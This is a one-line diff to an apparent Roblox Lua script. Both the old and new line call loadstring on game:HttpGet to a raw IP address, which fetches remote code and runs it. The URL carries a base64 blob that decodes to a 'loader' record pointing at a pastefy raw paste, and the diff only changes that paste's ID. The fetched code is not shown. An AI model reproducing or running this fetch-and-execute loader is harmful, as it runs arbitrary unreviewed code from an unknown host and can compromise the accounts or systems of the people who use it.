@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjAyNDdjYmZlLTNkYTMtNDdhZC1iMDE3LTQ2MGVhNTg2MmY2MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Bhc3RlZnkuYXBwL2lZRHlzdkhWL3JhdyJ9fQ"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjAyNDdjYmZlLTNkYTMtNDdhZC1iMDE3LTQ2MGVhNTg2MmY2MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Bhc3RlZnkuYXBwL1NyTlFEQTJQL3JhdyJ9fQ"))()
